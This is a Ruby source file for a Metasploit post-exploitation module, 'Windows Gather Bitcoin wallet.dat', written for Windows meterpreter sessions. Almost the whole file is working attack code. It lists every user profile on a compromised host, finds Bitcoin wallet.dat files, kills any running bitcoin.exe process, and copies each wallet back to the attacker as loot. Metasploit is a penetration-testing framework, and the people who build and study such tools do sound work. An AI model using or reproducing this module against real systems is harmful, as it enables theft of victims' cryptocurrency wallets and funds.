##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::UserProfiles

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather Bitcoin wallet.dat',
				'Description'   => %q{
					This module downloads any Bitcoin wallet.dat files from the target system
				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'illwill <illwill[at]illmob.org>'],
				'Platform'      => [ 'win' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def run
		print_status("Checking All Users For Bitcoin Wallet...")
		grab_user_profiles().each do |user|
			next if user['AppData'] == nil
			tmpath= user['AppData'] + "\\Bitcoin\\wallet.dat"
			jack_wallet(tmpath)
		end
	end

	def jack_wallet(filename)
		data     = ""
		found    = session.fs.file.stat(filename) rescue nil
		return if not found

		print_status("Wallet Found At #{filename}")
		print_status("     Jackin their wallet...")

		kill_bitcoin

		begin
			wallet = session.fs.file.new(filename, "rb")
			until wallet.eof?
				data << wallet.read
			end

			store_loot("bitcoin.wallet", "application/octet-stream", session, data, filename, "Bitcoin Wallet")
			print_status("     Wallet Jacked.")
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("Failed to download #{filename}: #{e.class} #{e}")
		end
	end

	def kill_bitcoin
		client.sys.process.get_processes().each do |x|
			if x['name'].downcase == "bitcoin.exe"
				print_status("     #{x['name']} Process Found...")
				print_status("     Killing Process ID #{x['pid']}...")
				session.sys.process.kill(x['pid']) rescue nil
			end
		end
	end

end
